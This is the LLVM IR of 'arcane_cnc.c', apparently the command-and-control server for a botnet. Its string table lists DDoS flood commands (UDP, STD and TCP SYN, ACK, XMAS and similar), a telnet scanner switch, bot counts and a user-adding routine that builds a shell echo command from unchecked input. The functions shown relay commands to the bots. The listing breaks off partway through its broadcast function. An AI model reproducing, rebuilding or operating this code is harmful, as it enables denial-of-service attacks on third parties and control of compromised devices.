; ModuleID = 'arcane_cnc.c'
source_filename = "arcane_cnc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [5000 x i8], [5000 x i8], [5000 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"21\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"25\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"53\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"67\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"68\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"69\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"80\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"110\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"123\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"143\00", align 1
@.str.13 = private unnamed_addr constant [4 x i8] c"443\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"3074\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"3075\00", align 1
@.str.16 = private unnamed_addr constant [5 x i8] c"8080\00", align 1
@ports = dso_local global [17 x i8*] [i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.16, i32 0, i32 0)], align 16
@.str.17 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.19 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.20 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.24 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.25 = private unnamed_addr constant [54 x i8] c"%c]0; Devices Connected: %d || Users Logged In: %d %c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.26 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.27 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.28 = private unnamed_addr constant [34 x i8] c"\1B[1;37m[\1B[90m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.30 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.31 = private unnamed_addr constant [34 x i8] c"\0A\1B[1;37m[\1B[90m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.32 = private unnamed_addr constant [6 x i8] c"staff\00", align 1
@.str.33 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.34 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.35 = private unnamed_addr constant [21 x i8] c"\1B[95mUsername\1B[97m: \00", align 1
@.str.36 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.37 = private unnamed_addr constant [21 x i8] c"\1B[95mPassword\1B[97m: \00", align 1
@.str.38 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.39 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [194 x i8] c"\1B[90m\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [70 x i8] c"\1B[97m             d8888                                            \0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [70 x i8] c"\1B[97m            d88888                                            \0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [70 x i8] c"\1B[97m           d88P888                                            \0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [70 x i8] c"\1B[97m          d88P 888 888d888 .d8888b  8888b.  88888b.   .d88b.  \0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [70 x i8] c"\1B[97m         d88P  888 888P'  d88P'        '88b 888 '88b d8P  Y8b \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [70 x i8] c"\1B[97m        d88P   888 888    888      .d888888 888  888 88888888 \0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [70 x i8] c"\1B[97m       d8888888888 888    Y88b.    888  888 888  888 Y8b.     \0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [70 x i8] c"\1B[97m      d88P     888 888     'Y8888P 'Y888888 888  888  'Y8888  \0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [70 x i8] c"\1B[90m                                                              \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [69 x i8] c"\1B[90m                           welcome to \1B[97marcane.           \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [69 x i8] c"\1B[90m                          made by \1B[97mswitch                \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [23 x i8] c"\1B[97marcane\1B[90m#\1B[37m\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.58 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.59 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.60 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[\1B[97mArcane\1B[1;37m.\1B[90mssh\1B[1;37m] - \1B[90m %d \0D\0A\1B[1;37m[\1B[97mArcane\1B[1;37m.\1B[1;34users\1B[1;37m] - \1B[90m %d \0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.64 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.65 = private unnamed_addr constant [17 x i8] c"\1B[97mcommands:\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [28 x i8] c"\1B[97m!* ASTD IP PORT TIME\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [38 x i8] c"\1B[97m!* AUDP IP PORT TIME SIZE 0 32\0D\0A\00", align 1
@.str.68 = private unnamed_addr constant [44 x i8] c"\1B[97m!* ATCP IP PORT TIME FLAGS SIZE 0 32\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [14 x i8] c"\1B[97mother:\0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [14 x i8] c"\1B[97mlogout\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [12 x i8] c"\1B[97mstop\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [13 x i8] c"\1B[97mclear\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"\1B[97mbots\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"\1B[97madmin\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.78 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.80 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[90m+\1B[1;37m]Special Commands\1B[1;37m[\1B[90m+\1B[1;37m]     \0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [82 x i8] c"\1B[1;37m[\1B[90m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[97mAdds User\1B[1;37m]          \1B[90m adduser\1B[1;37m    [\1B[90mUSER\1B[1;37m] [\1B[90mPASS\1B[1;37m] [\1B[90mSTAFF\1B[1;37m]\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[97mDomain Resolver\1B[1;37m]    \1B[90m resolve\1B[1;37m    [\1B[90mURL\1B[1;37m]\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.85 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] User:[\1B[90m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.86 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.87 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.90 = private unnamed_addr constant [85 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] User:[\1B[90m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.91 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.92 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] User: \1B[90m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.94 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.95 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.97 = private unnamed_addr constant [61 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.99 = private unnamed_addr constant [61 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.102 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.103 = private unnamed_addr constant [62 x i8] c"Resolved \1B[1;37m[\1B[90m%s\1B[1;37m] to \1B[1;37m[\1B[90m%s\1B[1;37m]\0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [58 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[90m!\1B[1;37\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.106 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.107 = private unnamed_addr constant [24 x i8] c"echo '%s' >> arcane.txt\00", align 1
@.str.108 = private unnamed_addr constant [86 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] \1B[1;37mUser:[\1B[90m%s\1B[1;37m] Added User:[\1B[90m%s\1B[1;37m]\0A\00", align 1
@.str.109 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] \1B[1;37mUser:[\1B[90m%s\1B[1;37m] Added User:[\1B[90m%s\1B[1;37m]\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [66 x i8] c"\1B[1;37mYou Dont Have \1B[90mPermission\1B[1;37m To Use This!\1B[1;37m\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.112 = private unnamed_addr constant [49 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.113 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.114 = private unnamed_addr constant [110 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mT\1B[1;32mC\1B[1;33mP\1B[90m-\1B[1;35mX\1B[1;36mM\1B[90mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.116 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP \1B[1;37mFlood using \1B[90mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.118 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.120 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.122 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.124 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.125 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.126 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"TRIO\00", align 1
@.str.128 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-TRIO \1B[1;37mFlood\0D\0A\00", align 1
@.str.129 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.130 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.132 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Sending \1B[90mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
@.str.134 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.135 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.136 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.138 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.139 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.140 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.141 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.143 = private unnamed_addr constant [85 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] User:[\1B[90m%s\1B[1;37m] - Command:\1B[1;37m[\1B[90m%s\1B[1;37m]\0A\00", align 1
@.str.144 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.145 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Screening Error\00", align 1
@.str.146 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Incoming Connection From \00", align 1
@.str.147 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.148 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Incoming Connection From [\1B[90m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.149 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.150 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.151 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[90mArcane\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.152 = private unnamed_addr constant [99 x i8] c"\1B[90m\1B[1;37m[\1B[90mArcane\1B[1;37m] Successfully Screened - Created By [\1B[90mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.153 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.154 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.155 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.156 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.157 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.158 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.159 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.17, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %61, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %64

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 2
  %47 = load i8, i8* %46, align 1
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 1
